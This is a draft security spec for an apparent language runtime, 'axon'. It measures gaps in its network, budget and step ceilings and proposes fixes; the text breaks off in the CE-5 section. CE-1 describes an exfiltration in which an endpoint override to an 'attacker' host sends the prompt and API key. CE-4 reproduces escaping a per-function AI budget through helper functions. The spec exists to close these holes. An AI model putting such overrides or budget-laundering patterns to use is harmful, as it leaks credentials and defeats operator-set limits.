# ceilings - DRAFT spec

**Status: PARTIAL 2026-11-02 on b2/ce d93f5d0d (CE-1, CE-7 built; the rest in progress; O-HI-03 open).**

Author: `Ceilings` (2026-11-01), base `main` a5310878 (worktree `/home/cklaus/projects/axon-lanes/asi-next`, branch `asi/next`).
Reference binary: `/var/tmp/r51-tmp/asi-bin/axon` (`axon 0.1.0 (a5310878)`, default features: `codegen`, no `asi-runtime`).
Scratch and probes: `/var/tmp/r51-tmp/Ceilings/p/` (sources below are verbatim). Corpus scan output: `/var/tmp/r51-tmp/Ceilings/scan.json`.
g01 block: **M4680-M4699 reserved**. No rows are written by this draft; §5 says which items need them at build time.
`[REVISED: CEA#13]` Every count in this spec is **at a5310878**: scan.json was taken there, against the a5310878 reference binary.
`main` has since moved to 44c0bdb5, which adds 21 files, among them `genviab/.../e01-score-average/reference.ax`. The auditor's
rescan at that HEAD gives R45 74/608 and deny-all 407. I did not re-run it.

Theme: VISION Goal 2 (`VISION.md:73-75`): "Code can do nothing until granted; the right to use the network, spend money,
or touch files is declared and bounded". VISION:60-62 adds: limits "are engine-enforced - you can't escape them by
hiding the action one call deeper". Several limits today bind only programs that declare something, or only the call
site that declares them. This spec measures each one and proposes one model (§3). The model changes what programs may do,
so every product question goes to the human (§9). Engineering choices are decided in §8.

Reading guide: §9 is the one-pass decision table. §1 is the tiers table. §2 has per-item reproductions and blast radius.
§3 is the proposed model. §6-7 are the build plan for after the decisions.

### Step 1 review

There were two reviews of the draft: `agent://AuditCeilings` (CEA#1-13) and `agent://DevloopCeilings` (CED-1..10). Integrator
rulings came with them. Before accepting a finding I re-ran its probe or read the cited line; the "verified by" column says
which. Every change in the body is marked `[REVISED: CEA#n/CED-n]`, and no item was deleted.

| id | finding | verified by | disposition |
|---|---|---|---|
| CEA#1 | CE-8 no-key half changes behaviour (rc 0 → exit 2) | `lib.rs:414-420` comment read; n01/n02 native rc 0 re-observed | **accepted**: moved to its own question NH-C10; removed from batch 0 |
| CEA#2 | two axon-ai tests would die | read `axon-ai/src/lib.rs:1533`, `:1760` (remove key + mock, assert rc 1; in-process bridge call) | **accepted**: both listed in NH-C10 |
| CEA#3 | the "union" pin widens | read `host_allowed` `axon-ai/src/lib.rs:139-148` | **accepted**: one pin rule (integrator ruling 2), in CE-1 |
| CEA#4 | self-overlap rule vs `fs_write: null` | logic | **accepted**: `fs_write` may not be `null` (decided, §8.4) |
| CEA#5 | CE-1 test-hit counts wrong | `git grep -c AXON_ALLOWED_NET`: cli_run.rs 3, ambient_scope.rs 6, axon-cortex cli.rs 2 | **accepted** |
| CEA#6 | option C count used another definition | recount on scan.json: 126 by the stated set, 105 after CE-7 | **accepted**: one set, 105 |
| CEA#7 | AI split is 19/22 | recount (comments/strings stripped): 19 direct, 22 `goal_*`-only; only goal-only refused by R45 is `persistent_learner.ax` | **accepted** |
| CEA#8 | NH-C7-B count | rebuilt all 41 AI programs: 18/19 direct build (`llm_cache` E0910), 5/22 goal-only build; `ad_optimizer.ax` has `ai_` only in comments (:26,:31) | **accepted**: both definitions counted |
| CEA#9 | `axon run -` unsupported | ran: `error: Axon source files must have a .ax extension (got '-')`, rc 1 | **accepted**: option C cost grows |
| CEA#10 | `AXON_MAX_DEPTH` default; R38 struct claim | `env_registry.rs:28` (default 6000); R38:177 `Budget{tool_calls, ai_usd_micro, wall_ms, max_depth}` | **accepted**: `max_depth` field added, "same struct" claim dropped |
| CEA#11 | R38:171-175 forbids freezing the fs/net/exec triple | read R38:171-178, :508-516 | **accepted**: cited in NH-C1 with a sub-choice |
| CEA#12 | CE-7 changes every sandbox's gate | read `interp/builtins.rs:779-781` (`pre_effect_gate(name, builtin_effect_row(name), ..)`), `:584-715`; new probe g02 (program-made sandbox, exit 8) | **accepted** |
| CEA#13 | base drift | `git log -1` = 44c0bdb5 | **accepted**: counts pinned to a5310878 |
| CEA collision note | the NH-R1 fence sets `AXON_ALLOWED_NET=""` and clears env | read `axon-cortex/tests/cli.rs:3261` | **accepted**: noted in §3 and NH-C9 |
| CED-1 | CE-1 test never runs in the gate | `asi-runtime`: 0 hits in `scripts/gate.sh`, `governance/gate-lanes.json` | **accepted**: always-compiled helper, default-build test, `cargo check` gate line |
| CED-2 | axon-ai pin test is not fail-first | `checked_endpoint_url` `lib.rs:171-180` already refuses outside a set pin | **accepted**: kept as guard |
| CED-3 | the CE-1 fix text contradicts itself | - | **accepted**, with the integrator's rule (ruling 2), which keeps "implicit host if none declared" |
| CED-4 | `no_ceiling_vm_emits_no_step_ops` is a guard; the fused-loop row has no test | ran `AXON_VM_TRACE=1` on s03: `vm: pure main 0 exprs, 1 loops` | **accepted**: s03 shape is the fused fixture |
| CED-5 | native tests never run in the gate unless in `integration_fixtures` | read `gate.sh:1188-1197` | **accepted** |
| CED-6 | strict-gate time stale; receipt regress unstated | `build-loop-gate-lane.md:95` "≈ 43–55 min"; `scorecard.py:89` REPAIR_SOURCES | **accepted**; the ≈95 min figure is the integrator's, not measured by me |
| CED-7 | lanes share `interp.rs`/`builtins.rs` | §7 table | **accepted**: one owner, serial |
| CED-8 | AF spec absent; batch 0 | `ls tasks/asi-fixes-spec.md`: absent at time of revision | **accepted**: batch 0 = CE-1, CE-7 (ruling 4); AF refs marked |
| CED-9 | CE-7 row anchor wrong file | `crates/axon-core/src/builtins.rs:2742-2748` | **accepted** |
| CED-10 | CE-2 tests RED only by wiring | - | **accepted**: kept as acceptance tests; RED claim rests on asserted exit/message |

Totals: 24 accepted (13 CEA + the CEA collision note + 10 CED), 0 rejected.

---

## 0. Source entries

| item | source | one line |
|---|---|---|
| CE-1 | O027 (`tasks/opportunities.md:992`), found while drafting | The operator's ambient net scope `AXON_ALLOWED_NET` never reaches the AI endpoint pin, so an endpoint override bypasses it in `asi-runtime` builds |
| CE-2 | R38 (`governance/specs/R38-embedded-agent-runtime.md:147`, `:171-177`, `:314-315`), R45 (`R45-require-contained.md:5`) | Per-run ceilings live in source attributes and in eight separate env vars. There is no single operator-authored ceiling, and none is recorded in provenance |
| CE-3 | O027 (`:992-1008`) | With no `@[contained(net: ..)]` grant, nothing pins the AI endpoint |
| CE-4 | O032 (`:1172`), R3c (`R3c-ai-budget-meter.md:33`, `:45`), spec-high-security-gates H3 (`tasks/spec-high-security-gates.md:174`) | `@[ai(policy(budget: N))]` counts only calls made while that fn is the current fn; a named helper escapes it |
| CE-5 | `tasks/opportunities.md:1954-1957` (fuel/step metering) | `while true {}` runs unbounded; there is no step or wall-clock ceiling |
| CE-6 | ROADMAP.md:547 (F4), VISION.md:126 (row 5) | The token cap `AXON_BUDGET_TOKENS` charges `prompt.len()/4+1` before dispatch and never charges the reply |
| CE-7 | found while drafting | `goal_*` builtins carry the row `{AI, Net, IO}`. An effect ceiling without `AI` refuses a `goal_run` whose metric never calls a model (exit 8) |
| CE-8 | O031 (`:1106`), O-HI-03 (`:1694`) | Native AI builds. Reproduced: native live calls already refuse (exit 2). The no-key path still diverges from the interpreter, a silent wrong answer under `fallback:`. `[REVISED: CEA#1]` Closing it is a behaviour change → NH-C10 |
| CE-9 | O034 (`:1250`) | The microVM guest's interpreter needs `FS` to open `/axon/program.ax`, so every guest that runs holds `FS` |
| CE-10 | R45 (`R45-require-contained.md:5`, Q2 `:224`) | `--require-contained` (deny undeclared capabilities) is off by default |

### Out of scope (logged, not dropped)

| what | why | where it lives |
|---|---|---|
| `ai_extract_uncertain_*` skip both the R3c gate and `AXON_BUDGET_TOKENS` (reproduced: `t02_token_cap_extract.ax` under `AXON_BUDGET_TOKENS=0` runs all five extracts, rc 0) | Owned by the sibling spec. CE-4/CE-6 hook the same shared pre-dispatch gate once AF-4 routes extracts through it | `tasks/asi-fixes-spec.md` AF-4 [pending asi-fixes-spec.md] |
| O026 / H1 (unmanifested guest gets `0xff`) | Already closed by AUDIT T48 (`axon-vm/src/main.rs:1114`); `tasks/opportunities.md` O-HI-02 (:1678) | none |
| USD metering inside the NH-R1 repair loop | NH-R1 non-goal (`tasks/unattended-auth-spec.md:39`) | NH-C9 records how the envelope may bind a ceiling later |
| R38 `Runtime::builder()` embedding API | Greenfield (R38:147). CE-2 defines the data type that API would carry. This spec does not build the API | R38 Slice 0 |
| Kill-switch from outside the process (R38:149) | Separate R27/R38 work | R38 |
| `axon_kernel_gate.sh` Layer-3 good-agent case vs a manifest (see CE-9, finding 3) | Gate script repair, not a ceiling decision; logged here so it is not lost | new opportunity entry at build time |

---

## 1. Priority tiers

| tier | items | meaning |
|---|---|---|
| P0 | CE-1 (batch 0); CE-8 no-key half (NH-C10) | Open hole or silent wrong answer on a path that exists today. `[REVISED: CEA#1, CED-8]` Only CE-1 is engineering-decided; CE-8's fix changes a run's exit code, so the human decides it |
| P1 | CE-7 (batch 0), CE-2, CE-10 | The model itself. CE-2 and CE-10 need NH-C1/NH-C2. CE-7 is decided, and it is a prerequisite for any ceiling that withholds `AI` |
| P2 | CE-3, CE-4, CE-5, CE-6 | New bounds. Each needs its NH answer |
| P3 | CE-9 | VM substrate. Needs a decision and probably a feasibility spike |

---

## 2. Items

### CE-1 (P0, decided) The operator's net scope does not pin the AI endpoint

**Anchors (a5310878).** `interp.rs:4348-4380` `declared_net_hosts` takes the union of source `@[contained(net: ..)]` hosts only.
`interp.rs:4383-4390` `pin_ai_net_allowlist` pins only `if !hosts.is_empty()`. It is called from `Interp::build_with`
(`interp.rs:5006`). `interp.rs:7627-7640` `ambient_sandbox` reads `AXON_ALLOWED_NET` into the sandbox scope and nowhere
else. `axon-ai/src/lib.rs:122` `NET_PIN`, `:135` `pin_net_allowlist`, `:171-178` `checked_endpoint_url` checks the
resolved base URL only when `NET_PIN` is set. `capabilities.rs:188-196` `ai_builtin_host` returns the fixed
`api.anthropic.com` for every AI builtin. The ambient scope check at dispatch (`interp/builtins.rs:719-740`) therefore checks the
*implicit* host and never the URL the request goes to.

**Reproduction.** In the default build the hole cannot be reached: the interpreter has no live AI (E1300), and native
refuses (CE-8). Observed:
```
$ cat c01_unannotated_ai.ax
fn main() {
    match ai_complete("hello") { Ok(s) => println(s), Err(e) => println(e) }
}
$ AXON_AI_MOCK=1 AXON_ALLOWED_NET= axon run c01_unannotated_ai.ax
axon: sandbox violation: builtin `ai_complete` is not permitted to reach host `api.anthropic.com`: the active sandbox restricts it to [] (principal handle 0)
rc=8
```
So the ambient scope is checked against `api.anthropic.com`. [INFERENCE from the anchors above; no `asi-runtime` binary
exists at a5310878 to run it: `find /var/tmp/r51-tmp ... -name axon` binaries contain no `net allowlist` string.]
In an `asi-runtime` build, `AXON_ALLOWED_NET=api.anthropic.com AXON_AI_BASE_URL=http://attacker:8080` passes the scope
check and then dials `attacker:8080` with the prompt and the API key. The same shape with a declared `@[contained]` grant
was reproduced end-to-end with a 127.0.0.1 sink when T35/RT-02 shipped (`interp.rs:4333-4341`).

**Fix (decided).** `[REVISED: CEA#3, CED-1, CED-3; integrator rulings 2-3]` There is one pin rule:

> pin = (declared hosts, or the implicit host if none are declared) ∩ each operator-side list that is set; `*` passes all.

- *Operator-side lists.* CE-1 ships with the ambient `AXON_ALLOWED_NET` only. The CE-2 ceiling's `net` list joins the
  intersection in CE-2's own commit. A list that is unset, or `*` (`parse_scope_list` → unrestricted), does not narrow.
- *Intersection with the leading-`*` glob* (`host_allowed`, `axon-ai/src/lib.rs:139-148`). Given base B and operator list L,
  the result is {b ∈ B : b is matched by L} ∪ {l ∈ L : l is matched by B}. A pattern `*s` is matched by `*t` when `s` ends
  with `t`. With literal hosts this is plain set intersection.
- *When the pin applies.* The pin is set when B comes from declared hosts (today's behaviour) or when any operator list is
  set. With neither, there is no pin; that case is CE-3.
- *Empty result.* `AXON_ALLOWED_NET=` (empty) gives an empty pin, so every live AI call is refused. That matches the
  dispatch check, which already refuses those calls (c01 probe, rc 8).

*Code shape.* A new always-compiled helper `fn ai_pin_hosts(program: &Program, ambient: Option<&[String]>) -> Option<Vec<String>>`
lives beside `declared_net_hosts` (`interp.rs:4348`), following the same "always compiled, unit-testable in the default build"
pattern (`interp.rs:4345-4347`). CE-2 adds a `ceiling_net` parameter. The `cfg(asi-runtime)` `pin_ai_net_allowlist`
(`:4383-4390`) is reduced to `if let Some(h) = ai_pin_hosts(..) { axon_ai::pin_net_allowlist(h) }`. The ambient list is
read through the existing `ambient_scope_var("AXON_ALLOWED_NET", ..)` (`interp.rs:7710`), so the AI pin and the sandbox
scope cannot parse the variable differently. No `axon-ai` edit is needed.

Alternatives considered:
- (a) Check the resolved URL at dispatch in `builtins.rs:719` instead. Rejected: `base_url` is resolved inside `axon-ai`,
  after `.env` loading (`axon-ai/src/lib.rs:259-273`), so a dispatch-time copy of that rule could drift. The pin is the
  single place.
- (b) Only document it. Rejected: an operator who set `AXON_ALLOWED_NET` believes AI traffic is fenced.
- (c) The draft's union of all three lists. Rejected (CEA#3): a program declaring `net:["x.com"]` under
  `AXON_ALLOWED_NET=api.anthropic.com` would pin `x.com`, and `AXON_AI_BASE_URL=https://x.com` would leave the operator's
  scope.
- (d) With no declared hosts, take the operator list itself as the base, so a gateway listed only in `AXON_ALLOWED_NET`
  works. Not taken: the integrator ruled the implicit-host base. Taking (d) would also be pointless without changing the
  dispatch check, which refuses that run today (probe below).

**Blast radius.** At a5310878, 0 tracked programs are affected; the default build makes no live calls. In an `asi-runtime` build:
- A run with `AXON_ALLOWED_NET` set, no declared net host, and `AXON_AI_BASE_URL` set to a gateway that the operator listed
  is **already refused today**, because the dispatch check tests the implicit host, not the base URL. CE-1 does not change
  this outcome. Observed (Step 1 revision):
  ```
  $ AXON_AI_MOCK=1 AXON_ALLOWED_NET=gw.example AXON_AI_BASE_URL=https://gw.example axon run c01_unannotated_ai.ax
  axon: sandbox violation: builtin `ai_complete` is not permitted to reach host `api.anthropic.com`: the active sandbox restricts it to ["gw.example"] (principal handle 0)
  rc=8
  ```
  So no run that works today is newly refused by CE-1. The runs it newly refuses are ones whose base URL leaves the
  operator's list while the implicit host stays inside it, which is the hole. Gateway users already have to declare the
  gateway in `@[contained(net: [..])]`. Documented gateway workflows: `.env.example:11,16`.
- `[REVISED: CEA#5]` No test sets both variables. `git grep -c AXON_ALLOWED_NET -- 'crates/*/tests/*.rs'` gives `cli_run.rs` 3,
  `ambient_scope.rs` 6 and `axon-cortex/tests/cli.rs` 2, and none of them sets a base URL.
- The NH-R1 fence sets `AXON_ALLOWED_NET=""` for check children (`axon-cortex/tests/cli.rs:3261`). Under CE-1 those children
  pin AI to the empty list, which is the same outcome as today's dispatch refusal.

**Fail-first tests** (`[REVISED: CED-1, CED-2, CED-3]`). These are unit tests in `crates/axon-core/src/interp.rs` that run in
the default build (`cargo test -p axon-core --no-default-features --lib ai_pin_hosts`, inside gate stage S16):
- `ai_pin_hosts_ambient_pins_unannotated_program`: no declared hosts, ambient `["gw.example"]` → `Some([])`.
- `ai_pin_hosts_intersects_declared_with_ambient`: declared `["x.com"]`, ambient `["api.anthropic.com"]` → `Some([])`.
  Declared `["*.x.com"]`, ambient `["a.x.com"]` → `Some(["a.x.com"])`.
  `[REVISED: build d9ad9086]` `declared_net_hosts` adds the implicit host to any non-empty declared set (T35), so the first
  case gives `Some(["api.anthropic.com"])`, not `Some([])`; the test asserts that `x.com` is absent, which is the CEA#3 point.
- `ai_pin_hosts_star_and_unset_do_not_narrow`: declared `["x.com"]`, ambient `*` or unset → `Some(["x.com"])`. With no
  declared hosts and ambient unset → `None`.

All three are RED at a5310878: the helper does not exist, and the code it replaces pins nothing in the first two cases. The
behavioural assertion is the returned list, not the missing symbol (CED-10).

Guard, not fail-first: an `axon-ai` unit test `pin_refuses_override_outside_pin`, in which `checked_endpoint_url` returns an
`Err` naming the host. It passes today. It runs in S20 only if axon-ai's `asi`-free build compiles it [INFERENCE: it is not
feature-gated today].
`[REVISED: build d9ad9086]` `NET_PIN` is a process-global first-wins `OnceLock`, so the guard exercises the pure check
(`host_allowed(host_of(url), pin)`) in `host_of_url_tests`, not `checked_endpoint_url` itself.

**Gate line** (`[REVISED: CED-1]`). Add `cargo check --locked -p axon-core --no-default-features --features asi-runtime` as a
`gate.sh` step with a `governance/gate-lanes.json` unit. Until it lands, `asi-runtime` is **not gated**: 0 hits in either
file at a5310878. Its wall time is not measured [INFERENCE: one extra `cargo check` including `reqwest`, a few minutes cold].
`[REVISED: build d9ad9086]` Measured 8.0 s cold (fresh target dir), so it runs on every gate, not `--strict` only. It sits in
stage S12, renamed "feature builds + tests (serde-json, asi-runtime)", rather than a new stage, so the lane registry needs no
new audited unit.

**Acceptance.**
- The three unit tests pass in the default build.
- In an `asi-runtime` build (manual, 127.0.0.1 listener), a base-URL override to a host outside the pin returns the existing
  "is not in this program's net allowlist" `Err`, and the listener sees no connection.
- The default build shows no observable change.

---

### CE-2 (P1, NH-C1) One operator-authored ceiling: `axon-ceiling/1`

**Today.** The operator has eight separate knobs and no single object that bounds a run:
`AXON_ALLOWED_EFFECTS`, `AXON_ALLOWED_FS_READ`, `AXON_ALLOWED_FS_WRITE`, `AXON_ALLOWED_NET`, `AXON_BUDGET_TOKENS`
(`env_registry.rs:50-57`), `AXON_MAX_DEPTH` (`:28`), `--require-contained` (a flag on `check`/`run`/`session`:
`main.rs:1069-1077`, `:1125-1131`, `:1161-1167`), and `AXON_VM_ALLOWED_EFFECTS` (axon-vm). `[REVISED: CEA#10]` Unset means
unrestricted for the scope and effect variables and the token cap (`interp.rs:7700-7720`). `AXON_MAX_DEPTH` is the exception:
unset means the default 6000 (`env_registry.rs:28`). Nothing records which ceiling bounded a run: `append_run_start_jsonl`
(`interp/provenance.rs:597-630`) writes run_id, seed and source only. R38:147 says ceilings must become *data* imposed from
outside. R38:314-315 says the ceiling must come from a host-authored source the generating model cannot write.

**Proposal (if NH-C1 = A).** A JSON file, `axon-ceiling/1`, supplied with `--ceiling FILE` on `run`/`session`/`goal`/`test`
or with `AXON_CEILING=FILE`:
```json
{ "schema": "axon-ceiling/1",
  "effects": ["IO", "AI", "Net"],
  "fs_read": ["/srv/job/in/"], "fs_write": ["/srv/job/out/"],
  "net": ["api.anthropic.com"],
  "ai_tokens": 200000, "ai_calls": 200,
  "steps": 2000000000, "wall_ms": 600000, "max_depth": 6000 }
```
Rules (engineering, decided in §8):
- Every key is required, and `null` means explicitly unbounded. `[REVISED: CEA#4]` The exception is `fs_write`, which must
  be a list (`[]` = no writes).
- An unknown key, a missing key, a malformed value or an unreadable file is **E1007**, exit 2, before any program code runs.
  This fails closed: a typo like `stpes` must not disarm a ceiling.
- `[REVISED: CED-7]` Each key enters the schema in the commit that enforces it (`steps`/`wall_ms` with CE-5, `ai_calls` with
  CE-6). The batch ships them all, so no released build accepts a key it does not enforce.

Each field narrows the existing mechanism it maps to:

| field | enforced by (existing site) | new? |
|---|---|---|
| `effects` | ambient sandbox effect set (`interp.rs:7627`, dispatch check in `pre_effect_gate`, `interp/builtins.rs:696-715`) | no |
| `fs_read` / `fs_write` / `net` | ambient scope (`interp.rs:7630-7637`, `builtins.rs:719-740`) + AI pin (CE-1) | no |
| `ai_tokens` | `token_budget` / E1303 (`interp/builtins.rs:6080-6098`) | unit per CE-6 |
| `ai_calls` | new run-wide count in the same pre-dispatch window (`builtins.rs:6048`), E1303 wording "calls"; built with CE-6 (`[REVISED: CED-7]`) | yes, ~30 lines |
| `steps`, `wall_ms` | CE-5 | yes |
| `max_depth` `[REVISED: CEA#10]` | `resolve_max_depth` (`interp.rs:2528`); effective depth = min(env or 6000, ceiling) | no |
| (presence) | `capabilities::set_require_contained(true)` (`capabilities.rs:350`) per NH-C2 | no |

When an env var and the ceiling are both set, the effective bound is their intersection (narrowest wins), and a program
can never widen it. The ceiling's sha256 goes into the `run_start` record (`provenance.rs:597`) as `ceiling_sha256`, plus
the effective bounds, so `axon trace` shows what bounded the run. Native binaries refuse under a ceiling, the same way they
refuse under ambient ceilings today: `refuse_if_ambient_ceiling` (`main.rs:3720-3740`) at build time and
`__axon_rt_refuse_interp_only_env` (`axon-rt/src/lib.rs:2089-2160`) at run time. Observed today for the existing variables:
```
$ axon build s03_count.ax -o s03.bin ; AXON_BUDGET_TOKENS=5 ./s03.bin
axon: `AXON_BUDGET_TOKENS` is set, but this is a NATIVELY BUILT binary and that control is honoured by the interpreter only.
rc=2
$ AXON_ALLOWED_EFFECTS=IO ./s03.bin      -> same refusal, rc=2
```

**Self-protection (decided).** `[REVISED: CEA#4]` The ceiling file's path must not lie inside its own `fs_write` scope;
otherwise E1007. `fs_write` is always a list (`null` is E1007), so the rule cannot be bypassed by an unbounded scope. A
ceiling therefore cannot grant writes to an ancestor directory of its own file. The rule mirrors NH-R1's
`repair_envelope::refuse_pin_overlap` (`tasks/unattended-auth-spec.md:160-165`), and it means a run cannot rewrite the ceiling
of the next run.

**Alternatives** (NH-C1):
- A: the file as above (recommended).
- B: add only the missing env vars (`AXON_MAX_STEPS`, `AXON_WALL_MS`, `AXON_AI_CALLS`) with no file. Cheaper, but there is
  still no single auditable object and no provenance digest.
- C: keep things as they are.

`[REVISED: CEA#11]` **Constraint from R38** (`R38:171-175`, `:508-516`): freezing the legacy `fs`/`net`/`exec` triple as a
*public* contract is forbidden until R38 §12 Q5 is resolved. R38's ceiling is defined as an effect row, with fs/net/exec as
sugar. `axon-ceiling/1` uses `effects` (a row) as the canonical part, but `fs_read`/`fs_write`/`net` are scope lists in the
same triple shape. NH-C1 therefore carries a sub-choice:
- A1: ship `axon-ceiling/1` documented as an operator file that is **not** the R38 public embedding contract, with its
  schema free to change under a version bump (recommended).
- A2: express the scopes as row-entry parameters (`"Net(api.anthropic.com)"`, `"FS.read(/srv/in/)"`), so the file *is*
  R38's row form. This means more design work now, on a surface R38 has not fixed.

**Blast radius.** None for runs without a ceiling: the file is opt-in, and NH-C2 decides the no-ceiling default. With a ceiling,
see CE-10 and the counts in §3.

**Tests** (`crates/axon-core/tests/ceiling.rs`, new, so it does not grow `cli_run.rs`):
- Acceptance tests: `ceiling_missing_key_is_e1007`, `ceiling_unknown_key_is_e1007`, `ceiling_fs_write_null_is_e1007`,
  `ceiling_intersects_env_never_widens` (`AXON_ALLOWED_EFFECTS=IO,AI` + ceiling `["IO"]` → an AI call exits 8 with the
  sandbox-violation message), `ceiling_digest_in_run_start`, `ceiling_inside_own_write_scope_is_e1007`.
- `[REVISED: CED-10]` Each asserts its specific exit code and message (E1007 text, or the exit-8 sandbox line), not merely a
  nonzero rc. RED at a5310878 therefore means "the asserted code/message is absent", not "the flag is unknown".
- `[REVISED: CED-5]` `native_refuses_under_ceiling` (build E0910, run exit 2) lives in `crates/axon-core/tests/integration_fixtures.rs`
  under `cfg(feature = "codegen")`. That is the only target the gate runs with codegen, and only under `--strict`
  (`gate.sh:1188-1197`). Its g01 row uses that target.

**Acceptance.** All six pass. `axon run --help` documents `--ceiling`, `env_registry.rs` has an `AXON_CEILING` row, and
`AXON_REFERENCE.md` lists it in its env table (`:103-112`).

---

### CE-3 (P2, NH-C3) The AI endpoint when nothing grants a host (O027)

**Anchors.** As in CE-1. `pin_ai_net_allowlist` returns without pinning when `declared_net_hosts` is empty
(`interp.rs:4386`), and `checked_endpoint_url` then accepts any `base_url` (`axon-ai/src/lib.rs:173`).

**Measured (at a5310878).** 41 check-clean tracked programs have the `AI` effect. **0** of them declare a net host, so all
41 are unpinned. `[REVISED: CEA#7]` 19 call a model builtin directly (counted with comments and string literals stripped).
22 reach `AI` only through `goal_*` rows (CE-7). Method: `axon caps --json` over every check-clean file, plus a regex for
`@[contained(...net:` (scan.json).

**Options.**
- A (recommended): **pin under any ceiling or ambient net scope; otherwise keep + document.** CE-1 pins under ambient
  `AXON_ALLOWED_NET` using the §CE-1 rule. Under a CE-2 ceiling the `net` field is mandatory, so every ceilinged run is pinned.
  A bare run stays as it is, and the docs say plainly: "an unceilinged run may send AI traffic to whatever `AXON_AI_BASE_URL`
  names". Blast radius: 0 tracked programs.
- B: **always pin to the implicit host when no grant exists.** `AXON_AI_BASE_URL` then works only if its host is
  `api.anthropic.com`, is in a grant, or is in `AXON_ALLOWED_NET`. Blast radius: 0 tracked programs (no default-build live AI).
  It breaks the documented gateway workflow (`.env.example:11,16`; `docs/TRAINLOOP_INTEGRATION.md`, 3 mentions of
  `AXON_AI_BASE_URL`; `crates/axon-cortex/benchmarks/ab/run_ab.py:639` strips `ANTHROPIC_BASE_URL`) unless users add
  `AXON_ALLOWED_NET`. [INFERENCE: users of `asi-runtime` builds outside this repo are not measurable.]
- C: keep and document only.

**Fail-first tests** (option B only): `ai_pin_hosts_bare_program_pins_implicit` (no declared, no operator list →
`Some(["api.anthropic.com"])`). This is a default-build unit test on the CE-1 helper (`[REVISED: CED-1]`), and it is RED
after CE-1 because the result is `None`.

**Cost.** A: ~0 beyond CE-1/CE-2 plus docs. B: ~20 lines in `pin_ai_net_allowlist`, plus docs and a CHANGELOG migration note.

---

### CE-4 (P2, NH-C4) Per-fn AI budget does not cover callees (O032)

**Anchors.** `interp/builtins.rs:6043-6063`: the R3c gate reads `current_ai_budget()` (`interp.rs:5614-5630`), which looks at
`current_fn_def()` only. `interp.rs:6130-6133` `AiBudgetGuard` saves and resets `ai_calls_this_fn` only on entry to a fn with
an `ai` attribute (`interp/sym.rs:491-493` `ai_metered`). A helper without `@[ai]` therefore counts against nothing. The
behaviour is spec-blessed: R3c:33 ("per-activation... counts the `ai_complete` calls made *while that fn is the current fn*")
and R3c:45 ("A's budget does not cover B's calls"). Native refuses every budgeted fn (`codegen/mod.rs:1275-1342`, F141), so
there is no parity surface.

**Reproductions** (`AXON_AI_MOCK=1`):
```
$ cat b01_helper_launder.ax
fn helper() -> i64 {
    let x = ai_complete("hidden")
    1
}

@[ai(policy(budget: 1))]
fn ask() -> i64 { helper() + helper() + helper() }

fn main() { println(to_str(ask())) }
$ axon run b01_helper_launder.ax
warning: [W1310] AI call in `helper` has no @[ai(policy)] — cost is unmetered and the call is harder to audit
3
rc=0                       # 3 AI calls under budget 1

$ cat b03_lambda_launder.ax          # a lambda does NOT escape: it runs with `ask` as the current fn
@[ai(policy(budget: 1))]
fn ask() -> i64 {
    let f = |p: str| match ai_complete(p) { Ok(s) => 1, Err(e) => 0 }
    f("a") + f("b") + f("c")
}

fn main() { println(to_str(ask())) }
$ axon run b03_lambda_launder.ax
axon: ai policy: [E1301] `ask` exceeded its AI budget of 1 call(s) — raise the budget or reduce ai_complete calls
rc=5

$ cat b05_nested_budgeted.ax
@[ai(policy(budget: 5))]
fn inner() -> i64 {
    let a = ai_complete("x")
    let b = ai_complete("y")
    2
}

@[ai(policy(budget: 1))]
fn outer() -> i64 { inner() + inner() + inner() }

fn main() { println(to_str(outer())) }
$ axon run b05_nested_budgeted.ax
6
rc=0                       # 6 AI calls under outer's budget 1
```
The run-level cap is already transitive: `AXON_BUDGET_TOKENS=0 axon run b01_helper_launder.ax` →
`[E1303] \`helper\` exceeded the run's token budget of 0 (used 0, this call needs ~2)`, rc 5.

**Options.**
- A (recommended): **dynamic extent.** A budgeted activation bounds every AI call made while it is on the stack. Each metered
  activation pushes `(fn, budget, used)` onto an `ai_budget_stack`. Every AI dispatch checks all frames, innermost first.
  The first exhausted frame raises E1301 naming *that* fn; otherwise every frame's `used` goes up by one. Nested budgets
  bound each other, so an agent can hand a callee only a smaller budget (VISION:74-75). R3c:33/:45 need a spec amendment,
  and this is it.
- B: keep and document (R3c as written; the high-sec H3 recommendation). The docs then say "a budget does not cover callees".
- C: static. Refuse at check time any budgeted fn whose callees reach AI without their own budget. This is a false-refusal
  risk: it refuses b01 although b01 is legal today. Rejected for the worst-outcome rule.

**Blast radius (A).** Tracked `.ax` using `budget:`: **0** (`git grep '@\[ai(policy' -- '*.ax'` gives
`examples/asi/ai_fallback.ax` with `fallback:` only, and `examples/stdlib/llm_gateway.ax`, where it appears only in a comment).
Inline tests: 26 `budget: N` sites in `cli_run.rs`. Known flip: `ai_budget_is_per_activation_through_unmetered_helpers`
(`cli_run.rs:17971-18033`). Its `r3c_nested_ok` case (outer budget 2 with 4 helper calls) becomes E1301, so the test is
rewritten to assert the new rule. The sites I read at `cli_run.rs:17800-17945` are single-fn and unchanged. [INFERENCE: the
other sites (`:1218`, `:8704-9010`, `:10935-11127`, `:18217`, `:25018`, `:25157`, `:27527`, `:40297`) are single-fn by their
grep lines; build must run them.]

**Fail-first tests** (`ceiling.rs` or `cli_run.rs` beside `:17971`): `budget_covers_unbudgeted_helper` (b01 → E1301 naming
`ask`, rc 5), `nested_budget_bounded_by_outer` (b05 → E1301 naming `outer`), `lambda_budget_unchanged` (b03 still E1301).
The first two are RED at a5310878.

**Cost.** ~80 lines: the stack replaces `ai_calls_this_fn` plus `AiBudgetGuard`. R3c spec amendment, CHANGELOG, pci theme,
`spec/axon-for-llms.md` budget paragraph. Sequenced after AF-4 [pending asi-fixes-spec.md], so extracts are charged too.

---

### CE-5 (P2, NH-C5) No step or wall-clock ceiling

**Anchors.** Tree engine: `interp/eval.rs:508` (`Expr::While`), `:534` (`Expr::WhileLet`), `:570` (`Expr::For`); call
entry and depth check `interp.rs:5879`. VM: back-edge `Op::Jump(head)` emitted at `interp/vm/compile.rs:377`;
`Op::ForTest`/`Op::ForNext` `compile.rs:422-448`; `Op::PureFor` (`compile.rs:1139`); dispatch loop
`interp/vm/mod.rs:1775`, `Op::Jump` at `:1932`; fused loops that never return to dispatch: `interp/vm/pure.rs:977`,
`:1286`; pure-`i64` fn tier frame loop `interp/vm/purefn.rs:492`. The only existing bound is recursion depth
(`AXON_MAX_DEPTH`, `interp.rs:2489-2540`). R27's ledger has a `compute` axis with exit 9 (`axon-os/src/ledger.rs:66-80`,
